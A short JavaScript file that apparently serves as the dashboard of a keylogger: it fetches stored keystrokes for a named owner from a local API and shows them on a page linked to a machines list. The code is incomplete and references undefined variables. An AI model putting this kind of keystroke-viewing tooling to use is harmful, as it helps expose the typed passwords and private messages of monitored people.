function logout(){
    window.location.href = 'MachinesList.html'
}

async function getData() {
    let data = await fetch('http://localhost:5000/api/get_keystrokes/' + ownerName);
    data = await data.json().then((data) => data)
    let p = document.createElement('p');
    p.textContent = JSON.stringify(data, null, 2);
    li.appendChild(p);
}

function main(){
    getData()
}

document.addEventListener("DOMContentLoaded", main);
